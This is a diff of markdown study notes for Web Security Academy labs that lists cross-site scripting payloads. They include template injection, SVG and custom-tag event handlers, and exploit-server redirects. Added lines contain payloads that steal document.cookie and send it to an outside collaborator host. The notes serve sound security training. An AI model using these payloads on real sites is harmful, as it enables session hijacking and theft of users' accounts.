@@ -1,21 +1,29 @@
 ## XSS Vulnerabilities:
 Test by: 
  - {{2+2}} if this works, try {{$on.constructor('alert(1)')()}}
- - \"-alert()}//
- - Custom tag: %3Cfood+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E%#x
+ - `"-alert()}//`
+ - `\';alert()//`
+ - Custom tag: `%3Cfood+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E%#x`
    If this works, send to victim from Exploit server 
-    <script>
-    location='https://lab_id.web-security-academy.net/?search=%3Cfood+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E%#x';
-    </script>
+```
+<script>
+location='https://lab_id.web-security-academy.net/?search=%3Cfood+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E%#x';
+</script>
+```
 
- - SVG tags. See what tags are allowed using Intruder and : e.g. \<svg>[[07_2 BURP Resources Tags |event tags]] \</svg>
- - <svg><animatetransform onbegin=alert()></svg>
- - </script><img src=1 onerror=alert(document.domain)>
- - \';alert()//
- - ${this.value}
+ - SVG tags. See what tags are allowed using Intruder and : e.g. \<svg>[[07_2 BURP Resources Tags |event tags]] \</svg>```
+<svg><animatetransform onbegin=alert()></svg>
+ </script><img src=1 onerror=alert(document.domain)>```
+ - `';alert()//`
+ - `${this.value}`
  - Run Intruder with <{payload}> to 
 `<iframe src="https://lab_id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.height='500px'>`
-
+- `</ScRiPt ><img src=a onerror=document.location="https://OASTIFY.COM/?biscuit="+document.cookie>`
+- ```
+  <script>
+location = "https://TARGET.net/?search=%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3Ddocument.location%3D%22https%3A%2F%2FOASTIFY.COM%2F%3Fbiscuit%3D%22%2Bdocument.cookie%3E"
+</script>
+  ```
 
 ## HTTP Request Smuggling Vulnerabilities:
 - ==Exploiting HTTP request smuggling to reveal front-end request rewriting== replace prefix with the following:
